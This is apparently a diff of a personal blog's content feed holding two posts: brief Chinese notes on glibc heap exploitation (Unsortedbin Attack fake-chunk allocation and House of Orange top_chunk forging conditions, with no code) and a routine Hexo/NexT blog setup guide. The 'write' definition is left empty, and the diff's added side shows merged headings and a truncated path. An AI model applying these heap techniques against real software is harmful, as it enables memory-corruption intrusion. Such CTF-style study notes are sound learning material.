 <span id="more"></span>
-<h1 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsortedbinattack分为leak和write两部分，leak是指“当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址，而这个地址可以通过查看libc的二进制文件逆向得出”，write是指“”。此外，unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
-<h2 id="申请fake-chunk"><a href="#申请fake-chunk" class="headerlink" title="申请fake_chunk"></a>申请fake_chunk</h2><p><strong>2.23版本</strong>  </p>
-<ul>
-<li>初状态<br>unsortedbin —&gt; chunk_victim  </li>
-</ul>
+<h1 id="unsortedbin-attack">Unsortedbin Attack</h1>
+<h2 id="概述">概述</h2>
+<p>Unsortedbinattack分为leak和write两部分，leak是指“当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址，而这个地址可以通过查看libc的二进制文件逆向得出”，write是指“”。此外，unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
+<h2 id="申请fake_chunk">申请fake_chunk</h2>
+<p><strong>2.23版本</strong><br />
+- 初状态<br />
+unsortedbin --&gt; chunk_victim</p>
 <blockquote>
 <p>此时我们令chunk_victim.bk = fake_chunk_head</p>
 </blockquote>
 <ul>
-<li>末状态<br>unsortedbin  —&gt; chunk_victim —&gt; fake_chunk</li>
+<li>末状态<br />
+unsortedbin --&gt; chunk_victim --&gt; fake_chunk</li>
 </ul>
 <blockquote>
 <p>连续申请两个chunk即可申请到fake_chunk</p>
 </blockquote>
-<h1 id="HouseofOrange"><a href="#HouseofOrange" class="headerlink" title="HouseofOrange"></a>HouseofOrange</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。    </p>
-<h2 id="伪造chunk需求"><a href="#伪造chunk需求" class="headerlink" title="伪造chunk需求"></a>伪造chunk需求</h2><ol>
-<li>top_chunk的结束地址必须页对齐  <ul>
-<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可  </li>
-</ul>
-</li>
-<li>top_chunk.size &gt;= MINSIZE  </li>
-<li>top_chunk.size &lt; chunk_size + MINSIZE</li>
-<li>top_chunk.prev_inuse == 1<ul>
-<li>第一点中说的0xfe0要变为0xfe1 </li>
-</ul>
-</li>
-</ol>
+<h1 id="houseoforange">HouseofOrange</h1>
+<h2 id="概述-1">概述</h2>
+<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。<br />
+## 伪造chunk需求 1. top_chunk的结束地址必须页对齐<br />
+-
+一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可<br />
+2. top_chunk.size &gt;= MINSIZE<br />
+3. top_chunk.size &lt; chunk_size + MINSIZE 4. top_chunk.prev_inuse == 1
+- 第一点中说的0xfe0要变为0xfe1</p>
 ]]></content>
       <categories>
         <category>Pwn</category>
@@ -403,150 +470,172 @@ baby一点都不baby...houseoforange+unsortedbinattack
     <content><![CDATA[<blockquote class="blockquote-center">
 鉴于我自己的创作欲，准备正式地经营我的博客XD
 </blockquote>
-
 <span id="more"></span>
-<h1 id="0x0-说在前面"><a href="#0x0-说在前面" class="headerlink" title="0x0 说在前面:"></a>0x0 说在前面:</h1><blockquote>
-<p>环境：Win11<br>参考资料：CodeSheep师傅在b站上的视频 &amp; Next官方文档</p>
+<h1 id="x0-说在前面">0x0 说在前面:</h1>
+<blockquote>
+<p>环境：Win11 参考资料：CodeSheep师傅在b站上的视频 &amp;
+Next官方文档</p>
+</blockquote>
+<blockquote>
 <p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
 </blockquote>
-<h1 id="0x1-Hexo初始化一个博客"><a href="#0x1-Hexo初始化一个博客" class="headerlink" title="0x1 Hexo初始化一个博客"></a>0x1 Hexo初始化一个博客</h1><p>首先，我们需要在<a href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
-<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
-<blockquote>
-<p>👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
-</blockquote>
+<h1 id="x1-hexo初始化一个博客">0x1 Hexo初始化一个博客</h1>
+<p>首先，我们需要在<a
+href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
+<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>
+&gt;👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
 <p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
-<hr>
+<hr />
 <p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
 <p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
 <p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
-<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
+<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
 <p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
 <blockquote>
 <p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
 </blockquote>
-<h1 id="0x2-Hexo-config-amp-Theme-config"><a href="#0x2-Hexo-config-amp-Theme-config" class="headerlink" title="0x2 Hexo config &amp; Theme config"></a>0x2 Hexo config &amp; Theme config</h1><p>我使用的这一个主题👇，这里具体讲讲博客的配置<br><a href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a><br>为了描述方便，在以下说明中：<br>将<strong><em>hexo init生成的config文件</em></strong>称为<code>站点配置文件</code><br>将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
-<hr>
+<h1 id="x2-hexo-config-theme-config">0x2 Hexo config &amp; Theme
+config</h1>
+<p>我使用的这一个主题👇，这里具体讲讲博客的配置 <a
+href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a>
+为了描述方便，在以下说明中： 将<strong><em>hexo
+init生成的config文件</em></strong>称为<code>站点配置文件</code>
+将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
+<hr />
 <ul>
-<li>配置主题<br>在hexo站点目录中用终端输入👇<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
-打开<strong><em>站点配置文件</em></strong>，修改:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
-<li>个人偏好-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
-<li>站点图像-<strong><em>主题配置文件</em></strong><br>修改之前记得在themes\\next\source\images文件夹中保存好你要上传的图像，图像尺寸要符合16x16和32x32<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure>
-</li>
+<li>配置主题 在hexo站点目录中用终端输入👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+打开<strong><em>站点配置文件</em></strong>，修改: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
+<li>个人偏好-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
+<li>站点图像-<strong><em>主题配置文件</em></strong>
+修改之前记得在themes\next，图像尺寸要符合16x16和32x32 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
+<hr />
 <ul>
-<li>社交链接-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure>
-</li>
+<li>社交链接-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
+<hr />
 <ul>
 <li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
 </ul>
-<p><strong><em>站点配置文件</em></strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><br><strong><em>主题配置文件</em></strong>：添加<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
-<hr>
+<p><strong><em>站点配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
+<strong><em>主题配置文件</em></strong>：添加 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure></p>
+<hr />
 <ul>
-<li>引用示例<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
+<li>引用示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote class=&quot;blockquote-center&quot;&gt;</span><br><span class="line">靡不有初 鲜克有终</span><br><span class="line">&lt;p&gt;&lt;p&gt;</span><br><span class="line">&lt;br&gt;《诗经》</span><br><span class="line">&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>
 <blockquote class="blockquote-center">
 靡不有初 鲜克有终
-<p><p>
+<p>
+<p>
 <br>《诗经》
-</blockquote>
-
-</li>
+</blockquote></li>
 </ul>
-<hr>
+<hr />
 <ul>
-<li>更大更有吸引力的图片来源于<code>&lt;img src=&quot;/image-url&quot; class=&quot;full-image&quot; /&gt;</code></li>
+<li>更大更有吸引力的图片来源于<code>&lt;img src="/image-url" class="full-image" /&gt;</code></li>
 </ul>
-<hr>
+<hr />
 <ul>
 <li>Bootstrap Callout使用方式</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note class_name %&#125; Content (md partial supported) &#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
-<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
+<p>其中，<code>class_name</code> 可以是以下列表中的一个值：</p>
 <div class="note default">
-            <p>default </p>
+            <p>default</p>
           </div>
 <div class="note primary">
-            <p>primary </p>
+            <p>primary</p>
           </div>
 <div class="note success">
-            <p>success </p>
+            <p>success</p>
           </div>
 <div class="note info">
-            <p>info </p>
+            <p>info</p>
           </div>
 <div class="note warning">
-            <p>warning </p>
+            <p>warning</p>
           </div>
 <div class="note danger">
-            <p>danger </p>
+            <p>danger</p>
           </div>
-<hr>
-<h1 id="0x3-LaTex配置"><a href="#0x3-LaTex配置" class="headerlink" title="0x3 LaTex配置"></a>0x3 LaTex配置</h1><blockquote>
+<hr />
+<h1 id="x3-latex配置">0x3 LaTex配置</h1>
+<blockquote>
 <p>我这边pandoc总是出错，于是转用了kramed</p>
 </blockquote>
-<p>终端输入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
+<p>终端输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cnpm uninstall hexo-renderer-marked --save</span><br><span class="line">cnpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
 <p><strong><em>主题配置文件</em></strong></p>
 <blockquote>
 <p>为了加快渲染速度，per_page我选的true，如果嫌麻烦可以直接false</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  # Default (true) will load mathjax / katex script on demand.</span><br><span class="line">  # That is it only render those page which has `mathjax: true` in Front-matter.</span><br><span class="line">  # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span><br><span class="line">  per_page: true</span><br><span class="line">  </span><br><span class="line">  # hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span><br><span class="line">  mathjax:</span><br><span class="line">    enable: true</span><br><span class="line">    # See: https://mhchem.github.io/MathJax-mhchem/</span><br><span class="line">    mhchem: false</span><br></pre></td></tr></table></figure>
-<p>记得在需要渲染的md加入<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
-<p>Test the $X_{n-1}$</p>
+<p>记得在需要渲染的md加入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure></p>
+<p>Test the <span class="math inline">\(X_{n-1}\)</span></p>
 <blockquote>
 <p>不过渲染后就导致写md时多了几个规矩</p>
-<ol>
-<li>—-的上下必须各空一格</li>
+<ol type="1">
+<li>---的上下必须各空一格</li>
 </ol>
 </blockquote>
-<p><a href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">【公式】KaTeX 使用指南（洛谷特供） - 白色过膝袜 - 洛谷博客 (luogu.com.cn)</a></p>
-<h1 id="0x4-Hexo-x-Next-美化"><a href="#0x4-Hexo-x-Next-美化" class="headerlink" title="0x4 Hexo x Next 美化"></a>0x4 Hexo x Next 美化</h1><ul>
-<li>动态背景<br>在<strong><em>站点目录</em></strong>打开git，输入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure>
-在<strong><em>主题配置文件</em></strong>中加入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure>
-</li>
+<p><a
+href="https://www.luogu.com.cn/blog/over-knee-socks/latex-gong-shi-tai-quan-fixed">【公式】KaTeX
+使用指南（洛谷特供） - 白色过膝袜 - 洛谷博客 (luogu.com.cn)</a></p>
+<h1 id="x4-hexo-x-next-美化">0x4 Hexo x Next 美化</h1>
+<ul>
+<li>动态背景 在<strong><em>站点目录</em></strong>打开git，输入
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest</span><br></pre></td></tr></table></figure> 在<strong><em>主题配置文件</em></strong>中加入
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">canvas_nest: # 网络背景</span><br><span class="line">  enable: true</span><br><span class="line">  onmobile: true # display on mobile or not</span><br><span class="line">  color: &#x27;0,0,0&#x27; # RGB values, use &#x27;,&#x27; to separate</span><br><span class="line">  opacity: 0.5 # the opacity of line: 0~1</span><br><span class="line">  zIndex: -1 # z-index property of the background</span><br><span class="line">  count: 150 # the number of lines</span><br></pre></td></tr></table></figure></li>
 </ul>
 <blockquote>
 <p>记得把其他的动态背景关闭呀，比如</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">three:</span><br><span class="line">  enable: false</span><br><span class="line">  three_waves: false</span><br><span class="line">  canvas_lines: true</span><br><span class="line">  canvas_sphere: false</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br></pre></td></tr></table></figure>
-<hr>
+<hr />
 <ul>
-<li>文章结尾<br>在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>
-</li>
+<li>文章结尾
+在路径 <code>\themes\next\layout\_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件,并添加以下内容：
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------文章就到这里啦！&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读XD-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+接着打开<code>\themes\next\layout\_macro\post.swig</code>文件，在<code>post-body</code> 之后(<code>END POST BODY</code>)， <code>post-footer</code> 之前添加以下代码:
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt; </span><br><span class="line">	&#123;% if not is_index %&#125; </span><br><span class="line">		&#123;% include &#x27;passage-end-tag.swig&#x27; %&#125; </span><br><span class="line">	&#123;% endif %&#125; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+然后打开<strong><em>主题配置文件</em></strong>，在末尾添加：
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passage_end_tag: </span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
+<hr />
 <ul>
-<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
+<li>贴一个<a href="https://fontawesome.dashgame.com/">图标库Font
+Awesome)</a>，<strong><em>主题配置文件</em></strong>里的在线图标基本都要用到它</li>
 </ul>
-<hr>
+<hr />
 <ul>
-<li>代码块复制<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure>
-</li>
+<li>代码块复制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: night</span><br><span class="line">codeblock:</span><br><span class="line">  border_radius:</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
+<hr />
 <ul>
-<li>回到顶部与阅读进度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure>
-附一些参考资料XD~</li>
+<li>回到顶部与阅读进度 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line">  # Back to top in sidebar.</span><br><span class="line">  sidebar: false</span><br><span class="line">  # Scroll percent label in b2t button.</span><br><span class="line">  scrollpercent: true</span><br><span class="line">  </span><br><span class="line"># Reading progress bar</span><br><span class="line">reading_progress:</span><br><span class="line">  enable: true</span><br><span class="line">  # Available values: top | bottom</span><br><span class="line">  position: top</span><br><span class="line">  color: &quot;#7B68EE&quot;</span><br><span class="line">  height: 3px</span><br></pre></td></tr></table></figure> 附一些参考资料XD~</li>
 </ul>
-<p><a href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科 (baidu.com)</a></p>
-<hr>
+<p><a
+href="https://baike.baidu.com/item/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81#:~:text=%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E7%A0%81%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BD%AF%E4%BB%B6%E4%B8%AD%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82%E5%9C%A8%E5%BE%88%E5%A4%9A%E8%BD%AF%E4%BB%B6%E4%B8%AD%EF%BC%8C%E9%83%BD%E4%BC%9A%E9%81%87%E5%88%B0%E8%AE%BE%E5%AE%9A%E9%A2%9C%E8%89%B2%E5%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%8F%91%E5%B1%95%E6%9D%A5%E6%BA%90%20%E4%BA%BA%E7%9A%84%E7%9C%BC%E7%9D%9B%E7%9C%8B%E5%88%B0%E7%9A%84%E9%A2%9C%E8%89%B2%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%9A,%E4%B8%80%E7%A7%8D%E6%98%AF%E5%8F%91%E5%85%89%E4%BD%93%E5%8F%91%E5%87%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%8C%E6%AF%94%E5%A6%82%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%BE%E7%A4%BA%E5%99%A8%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%A2%9C%E8%89%B2%EF%BC%9B%20%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%98%AF%E7%89%A9%E4%BD%93%E6%9C%AC%E8%BA%AB%E4%B8%8D%E5%8F%91%E5%85%89%EF%BC%8C%E8%80%8C%E6%98%AF%E5%8F%8D%E5%B0%84%E7%9A%84%E5%85%89%E4%BA%A7%E7%94%9F%20%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E9%A2%9C%E8%89%B2%E3%80%82">十六进制颜色码_百度百科
+(baidu.com)</a></p>
+<hr />
 <ul>
-<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure>
-</li>
+<li>增加阅读次数/时长和访客数-<strong><em>主题配置文件</em></strong>
